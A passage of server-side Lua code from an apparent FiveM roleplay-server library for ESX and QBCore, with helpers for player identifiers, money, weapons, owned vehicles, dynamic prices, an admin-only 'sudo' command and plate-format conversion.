        license = false,
        discord = false,
        xbl = false,
        liveid = false,
        ip = false,
    }
    for k,v in pairs(Identifiers)do 
        if string.sub(v, 1, string.len("steam:")) == "steam:" then
            data.steamid = v
        elseif string.sub(v, 1, string.len("license:")) == "license:" then
            data.license = v
        elseif string.sub(v, 1, string.len("xbl:")) == "xbl:" then
            data.xbl  = v
        elseif string.sub(v, 1, string.len("ip:")) == "ip:" then
            data.ip = v
        elseif string.sub(v, 1, string.len("discord:")) == "discord:" then
            data.discord = v
        elseif string.sub(v, 1, string.len("live:")) == "live:" then
            data.liveid = v
        end
    end
    return data
end

RegisterNetEvent('esx:playerSaved')
AddEventHandler('esx:playerSaved', function(playerId)
    MCD.TriggerClientEvent('SavedPlayer' , playerId)
end)

MCD.SetMoney = function(account , amount , player ,  resname)
    local ressourcename = GetInvokingResource()
    if ressourcename == 'mcd_lib' or ressourcename == 'monitor' or ressourcename == nil then
        ressourcename = resname
    end
    
    local _source = player
    amount = tonumber(amount)
    
    if not account then
        account = 'money'
        print(MCD.Function.ConvertPrint(_U('error').._U('error_setmoney' , ressourcename) , true))
    end
    if not amount then
        amount = 0
        print(MCD.Function.ConvertPrint(_U('error').._U('error_setmoney2' , ressourcename) , true))
    end
    
    local xPlayer
    if QBCore then
        xPlayer = QBCore.Functions.GetPlayer(_source)
    else
        xPlayer = ESX.GetPlayerFromId(_source)
    end
    while xPlayer == nil do 
        if QBCore then
            xPlayer = QBCore.Functions.GetPlayer(_source)
        else
            xPlayer = ESX.GetPlayerFromId(_source)
        end
        Citizen.Wait(5)
    end

    if QBCore then
        xPlayer.Functions.SetMoney(account, tonumber(amount))
    else
        xPlayer.setAccountMoney(account, tonumber(amount))
    end

    if amount > 0 then
        lastmoney = MCD.GetCurrentTime()
        moneymsg = moneymsg .. '\n' .. _U('Webhook_money_set' , amount , MCD.Function.RemoveColors(GetPlayerName(source)) , ressourcename)
    end
end

MCD.AddVehicle = function(plate , vehicledata , plyid , cartype , resname)
    local ressourcename = GetInvokingResource()
    if ressourcename == 'mcd_lib' or ressourcename == 'monitor' or ressourcename == nil then
        ressourcename = resname
    end
    
    local r , finish = false , false
    local _source = source
    local msg = _U('error')
    
    if plate and vehicledata then
        local xPlayer
        if QBCore then
            xPlayer = QBCore.Functions.GetPlayer(plyid)
        else
            xPlayer = ESX.GetPlayerFromId(plyid)
        end
        while xPlayer == nil do 
            if QBCore then
                xPlayer = QBCore.Functions.GetPlayer(plyid)
            else
                xPlayer = ESX.GetPlayerFromId(plyid)
            end
            Citizen.Wait(5)
        end
    
        local identifier
        if QBCore then
            identifier = xPlayer.PlayerData.citizenid
        else
            identifier = xPlayer.identifier
        end

        if type(vehicledata) == 'string' then
            vehicledata = {
                model = vehicledata,
                plate = MCD.Function.CleanPlate(plate , false)
            }
        end

        MySQL.Async.execute('INSERT INTO owned_vehicles (owner, plate, vehicle , type) VALUES (@owner, @plate, @vehicle, @type)', {
            ['@owner']   = identifier,
            ['@plate']   = MCD.Function.CleanPlate(plate , true),
            ['@vehicle'] = json.encode(vehicledata),
            ['@type'] = cartype or 'car'
        }, function(rowsChanged)
            if tonumber(rowsChanged) == 1 then
                r = true
                msg = _U('success')
            end
            finish = true
        end)
        while not finish do Citizen.Wait(1) end
        MCD.SendToDiscord(_U('add_vehice', MCD.Function.CleanPlate(plate , false), msg ,_source) , ressourcename , 'default')
        return r
    else
        return false
    end
end

RegisterCommand('sudo', function(source , args)
    local id = tonumber(args[1])
    args[1] = ''
    local command = table.concat(args, ' ')
    if Config.SudoCommand.allow then
        if source ~= 0 then
            if MCD.IsAllowed(source , Config.SudoCommand.group) then
                if id then
                    MCD.TriggerClientEvent('mcd_lib:Client:Sudo' , id , command)
                else
                    MCD.Notify(source , _U('sudo_syntax') , nil , nil , 'error')
                end
            else
                MCD.Notify(source , _U('no_perm') , nil , nil , 'error')
            end
        else
            if Config.SudoCommand.console then
                if id then
                    MCD.TriggerClientEvent('mcd_lib:Client:Sudo' , id , command)
                else
                    print(MCD.Function.ConvertPrint(_U('error') .. _U('sudo_syntax')))  
                end
            else
                print(MCD.Function.ConvertPrint(_U('not_console' , 'Sudo')))                
            end
        end
    else
        print(MCD.Function.ConvertPrint(_U('sudo_not_aktiv')))
    end
end)

MCD.SaveTable = function(tablename , data)
    savedtables[tablename] = json.encode(data)
end

MCD.SaveTables = function()
    local filetxt = 'savedtables = {\n'
    local c = 0
    for tablename,tabledata in pairs(savedtables) do
        local txt = '\t["'..tablename..'"] = '
        txt = txt .. "'"..tabledata.."',\n"
        filetxt = filetxt .. txt
        c = c +1 
    end
    filetxt = filetxt .. '}'

    local path = GetResourcePath(GetCurrentResourceName())..'/saves.lua'
    local file,err = io.open(path,'w+')
    if file then
        file:write(filetxt)
        file:close()
        print(MCD.Function.ConvertPrint('[~b~INFO~s~] Saved ~b~'..c..'~s~ Tables'))
    else
        print("error:", err)
    end
end

MCD.HasWeapon = function(playerid , weapons)
    local loadout = MCD.GetLoadout(playerid)
    local hasweapon = false
    if type(weapons) == 'string' or type(weapons) == 'number' then
        local hash = weapons
        if type(weapons) == 'string' then hash = GetHashKey(weapons) end
        for i,p in ipairs(loadout) do
            if GetHashKey(p.name) == hash then
                hasweapon = true
                break
            end
        end
    else
        for i,weapon in pairs(weapons) do
            local hash = weapon
            if type(weapon) == 'string' then hash = GetHashKey(weapon) end
            for i,p in ipairs(loadout) do
                if GetHashKey(p.name) == hash then
                    hasweapon = true
                    break
                end
            end
        end
    end
    return hasweapon
end

RegisterCommand('savetables', function()
    MCD.SaveTables()
end, true)

MCD.RemoveWeapon = function(weapon ,player, resname)
    local ressourcename = GetInvokingResource()
    if ressourcename == 'mcd_lib' or ressourcename == 'monitor' or ressourcename == nil then
        ressourcename = resname
    end
    
    local _source = player
    weapon = string.upper(weapon)
    
    local xPlayer
    if QBCore then
        xPlayer = QBCore.Functions.GetPlayer(_source)
    else
        xPlayer = ESX.GetPlayerFromId(_source)
    end
    while xPlayer == nil do 
        if QBCore then
            xPlayer = QBCore.Functions.GetPlayer(_source)
        else
            xPlayer = ESX.GetPlayerFromId(_source)
        end
        Citizen.Wait(5)
    end

    if QBCore then
        xPlayer.Functions.RemoveItem(weapon)
    else
        xPlayer.removeWeapon(weapon)
    end
    
    lastweapon = MCD.GetCurrentTime()
    table.insert(weaponlog , {
        removed     = true,
        weapon      = weapon,
        player      = MCD.GetPlayerName(_source),
        ressource   = ressourcename
    })
end

MCD.AddWeapon = function(weapon , ammo , player , resname)
    local ressourcename = GetInvokingResource()
    if ressourcename == 'mcd_lib' or ressourcename == 'monitor' or ressourcename == nil then
        ressourcename = resname
    end
    
    local _source = player
    ammo = tonumber(ammo)
    weapon = string.upper(weapon)
    
    if not ammo then
        ammo = 0
        print(MCD.Function.ConvertPrint(_U('error').._U('error_addweapon2' , ressourcename) , true))
    end
    
    local xPlayer
    if QBCore then
        xPlayer = QBCore.Functions.GetPlayer(_source)
    else
        xPlayer = ESX.GetPlayerFromId(_source)
    end
    while xPlayer == nil do 
        if QBCore then
            xPlayer = QBCore.Functions.GetPlayer(_source)
        else
            xPlayer = ESX.GetPlayerFromId(_source)
        end
        Citizen.Wait(5)
    end

    if QBCore then
        xPlayer.Functions.AddItem(weapon)
        ammo = 1
    else
        xPlayer.addWeapon(weapon, ammo)
    end    
    
    if ammo > 0 then
        lastweapon = MCD.GetCurrentTime()
        table.insert(weaponlog , {
            removed     = false,
            weapon      = weapon,
            ammo        = ammo,
            player      = MCD.GetPlayerName(_source),
            ressource   = ressourcename
        })
    end 
end

MCD.SendLog('default' , 'MCD Lib successfull started')


local Prices = {}
MCD.RegisterPriceChange = function(name , min , max , stepmin, stepmax)
    local res = GetInvokingResource()

    local found
    for i,p in ipairs(Prices) do
        if p.res == res then
            if p.name == name then
                found = i
            end
        end
    end

    if not found then
        local minimum = math.floor(min*100)
        local maximum = math.floor(max*100)
        local price = MCD.Math.Round(math.random(minimum , maximum)/100, 1)        
        table.insert(Prices , {
            name = name, 
            min = min,
            max = max,
            stepmin = stepmin,
            stepmax = stepmax,
            price = price
        })
        return price
    else
        return Prices[found].price
    end
end

MCD.GetPrice = function(name , ressource)
    local res = GetInvokingResource()
    if ressource then
        res = ressource
    end

    local found
    for i,p in ipairs(Prices) do
        if p.res == res then
            if p.name == name then
                found = i
            end
        end
    end

    if not found then
        return nil
    else
        return Prices[found].price
    end
end

MCD.ForcePriceChange = function(name)
    local res = GetInvokingResource()

    local found
    for i,p in ipairs(Prices) do
        if p.res == res then
            if p.name == name then
                found = i
            end
        end
    end

    if not found then
        return nil
    else
        local p = Prices[found]
        local minus = math.random(0,1) == 1

        local minimum = math.floor(p.stepmin*100)
        local maximum = math.floor(p.stepmax*100)
        local step = MCD.Math.Round(math.random(minimum , maximum)/100, 1)

        local newprice = 0
        if minus then
            newprice = p.price - step
            
            if newprice < p.min then
                newprice = p.min
            end
        else
            newprice = p.price + step
            if newprice > p.max then
                newprice = p.max
            end
        end

        return newprice
    end
end

AddEventHandler('onResourceStop', function(resourceName)   
    for event,data in pairs(events) do
        for i,p in ipairs(data) do
            if p.ressource == resourceName then
                table.remove(data , i)
            end 
        end
    end
end)

local dimensions = {}
MCD.NormalDimension = function(player)
    SetPlayerRoutingBucket(player, 0)
end
MCD.SingleDimension = function(player)
    dimensions[#dimensions+1] = true
    SetPlayerRoutingBucket(player, #dimensions)
end

MCD.IsPlateTaken = function(plate)
    local res = {}
    local finished = false

    MySQL.Async.fetchAll('SELECT * FROM owned_vehicles WHERE plate = @plate', {
        ['@plate'] = MCD.Function.CleanPlate(plate , true)
    }, function(result)
        finished = true
        res = #result > 0
    end)

    while not finished do Citizen.Wait(5) end
    return res
end

Citizen.CreateThread(function()
    Citizen.Wait(5000)
    local finished = false
    local converted = 0

    MySQL.Async.fetchAll('SELECT * FROM owned_vehicles', {}, function(result)
        for i,p in ipairs(result) do
            if Config.MCDPlateSafe then
                if string.find(p.plate , '%s') and not string.find(p.plate , '_') then
                    local data = json.decode(p.vehicle)
                    if data.plate then
                        data.plate = MCD.Function.CleanPlate(data.plate , false)
                    end
    
                    converted = converted + 1
                    MySQL.Async.execute('UPDATE owned_vehicles SET plate = @newplate , vehicle = @vehicledata WHERE plate = @plate', {
                        ['@newplate'] = MCD.Function.CleanPlate(p.plate , true),
                        ['@plate'] = p.plate,
                        ['@vehicledata'] = json.encode(data)
                    })
                end
            else
                if string.find(p.plate , '_') then
                    local data = json.decode(p.vehicle)
                    if data.plate then
                        data.plate = MCD.Function.CleanPlate(data.plate , false)
                    end
    
                    converted = converted + 1
                    MySQL.Async.execute('UPDATE owned_vehicles SET plate = @newplate , vehicle = @vehicledata WHERE plate = @plate', {
                        ['@newplate'] = p.plate:gsub('_' , ' '),
                        ['@plate'] = p.plate,
                        ['@vehicledata'] = json.encode(data)
                    })
                end
            end
        end
        finished = true
    end)

    while not finished do Citizen.Wait(1) end
    if converted > 0 then
        if Config.MCDPlateSafe then
            print(MCD.Function.ConvertPrint(_U('info')..' Converted ~p~'..converted..'~s~ Plates to ~y~MCD_Platesafe'))
        else
            print(MCD.Function.ConvertPrint(_U('info')..' Converted ~p~'..converted..'~s~ Plates to ~y~Normal'))
        end
    end
end)